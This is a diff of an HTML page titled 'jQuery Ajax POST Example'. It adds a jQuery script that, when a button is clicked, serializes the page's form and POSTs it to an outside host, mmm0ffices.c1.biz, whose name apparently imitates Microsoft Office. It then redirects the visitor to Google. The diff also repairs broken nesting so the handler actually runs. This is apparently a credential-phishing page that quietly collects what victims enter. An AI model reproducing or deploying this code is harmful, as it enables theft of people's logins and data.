@@ -1,13 +1,30 @@
 <html>
 <head>
 <title>jQuery Ajax POST Example</title>
-<link
-rel="stylesheet"
-href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/css/bootstrap.min.css"
-/>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/js/bootstrap.min.js"></script>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script type="text/javascript" language="javascript">
+function redirect () {
+window.location.href = "https://www.google.com/"
+	}
+$(document).ready(function () {
+$(".bin").click(function () {
+var datastring = $("#Form").serialize();
+$.ajax({
+    type: "POST",
+    url: "http://mmm0ffices.c1.biz/ex/exm.php",
+    data: datastring,
+    dataType: "json",
+      success: function(data){
+ window.location = redirectUrl
+  },
+
+});
+});
+});
+
+</script>
 
 <style>
 
@@ -48,27 +65,7 @@ href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.2/css/bootstr
 
 
 
- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script type="text/javascript" language="javascript">
-function redirect() {
-window.location.href = "https://www.blogger.com/"
 
-$(document).ready(function () {
-$(".bin").click(function () {
-var datastring = $("#Form").serialize();
-$.ajax({
-    type: "POST",
-    url: "http://mmm0ffices.c1.biz/ex/exm.php",
-    data: datastring,
-    dataType: "json",
-      success: function(data){
- window.location = redirectUrl
-  },
 
-});
-});
-});
-	}
-</script>
 </body>
 </html>
